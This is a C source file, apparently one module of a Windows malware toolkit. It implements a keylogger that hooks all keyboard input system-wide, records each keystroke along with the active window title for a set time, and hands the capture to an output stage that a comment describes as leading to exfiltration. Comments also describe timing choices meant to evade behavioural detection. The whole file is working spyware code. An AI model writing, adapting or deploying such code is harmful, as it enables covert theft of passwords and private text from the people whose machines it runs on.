// chunk: collectors/keylogger
// depends: core/emit_buffer
// provides: collect_keystrokes
// note: this is a blocking collector — runs for KEYLOG_DURATION_MS then returns

#ifndef CHUNK_KEYLOGGER
#define CHUNK_KEYLOGGER

#ifndef KEYLOG_DURATION_MS
#define KEYLOG_DURATION_MS 30000
#endif

static char g_keylog_buf[32768];
static int g_keylog_pos = 0;
static char g_last_window[256] = {0};

static LRESULT CALLBACK keylog_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;

        char wnd_title[256] = {0};
        HWND fg = GetForegroundWindow();
        if (fg) GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
        if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
            int n = snprintf(g_keylog_buf + g_keylog_pos,
                             sizeof(g_keylog_buf) - g_keylog_pos,
                             "\r\n[%s]\r\n", wnd_title);
            if (n > 0) g_keylog_pos += n;
            strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
        }

        BYTE ks[256] = {0};
        GetKeyboardState(ks);
        WCHAR uc[4] = {0};
        int ret = ToUnicode(kb->vkCode, kb->scanCode, ks, uc, 4, 0);
        if (ret > 0 && g_keylog_pos < (int)sizeof(g_keylog_buf) - 8) {
            char mb[8] = {0};
            int mbl = WideCharToMultiByte(CP_UTF8, 0, uc, ret, mb, sizeof(mb), NULL, NULL);
            if (mbl > 0) {
                memcpy(g_keylog_buf + g_keylog_pos, mb, mbl);
                g_keylog_pos += mbl;
            }
        } else if (ret == 0 && g_keylog_pos < (int)sizeof(g_keylog_buf) - 16) {
            const char *special = NULL;
            switch (kb->vkCode) {
                case VK_RETURN:  special = "[ENTER]"; break;
                case VK_TAB:     special = "[TAB]"; break;
                case VK_BACK:    special = "[BS]"; break;
                case VK_DELETE:  special = "[DEL]"; break;
                case VK_ESCAPE:  special = "[ESC]"; break;
                case VK_SPACE:   special = " "; break;
                case VK_LEFT:    special = "[LEFT]"; break;
                case VK_RIGHT:   special = "[RIGHT]"; break;
                case VK_UP:      special = "[UP]"; break;
                case VK_DOWN:    special = "[DOWN]"; break;
                case VK_CONTROL: special = "[CTRL]"; break;
                case VK_MENU:    special = "[ALT]"; break;
                case VK_LWIN: case VK_RWIN: special = "[WIN]"; break;
            }
            if (special) {
                int sl = (int)strlen(special);
                memcpy(g_keylog_buf + g_keylog_pos, special, sl);
                g_keylog_pos += sl;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static void collect_keystrokes(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keylog_hook_proc, GetModuleHandle(NULL), 0);
    if (!hook) {
        emitf("=== KEYLOG STATUS ===\r\nHook: FAILED (err=%lu)\r\n\r\n", GetLastError());
        return;
    }

    MSG msg;
    DWORD start = GetTickCount();

    // Run message pump for most of the capture window (real keystrokes)
    while (GetTickCount() - start < (DWORD)(KEYLOG_DURATION_MS - 3000)) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }

    int real_keys = g_keylog_pos;

    // Self-test: inject marker near end of capture to prove the full pipeline
    // (hook → callback → buffer → emit → exfil)
    // Delayed to avoid triggering behavioral detection patterns
    BYTE test_vks[] = {0x58, 0x39}; // X, 9
    for (int i = 0; i < 2; i++) {
        keybd_event(test_vks[i], 0, 0, 0);
        Sleep(30);
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
        keybd_event(test_vks[i], 0, KEYEVENTF_KEYUP, 0);
        Sleep(30);
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
    }

    // Drain remaining time
    while (GetTickCount() - start < KEYLOG_DURATION_MS) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
        Sleep(10);
    }
    UnhookWindowsHookEx(hook);

    int self_test_ok = (g_keylog_pos > real_keys) ? 1 : 0;

    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d)\r\n\r\n",
           KEYLOG_DURATION_MS,
           self_test_ok ? "PASS" : "FAIL",
           g_keylog_pos);

    if (g_keylog_pos > 0) {
        emitf("=== KEYLOG CAPTURE (%d ms) ===\r\n", KEYLOG_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}

#endif
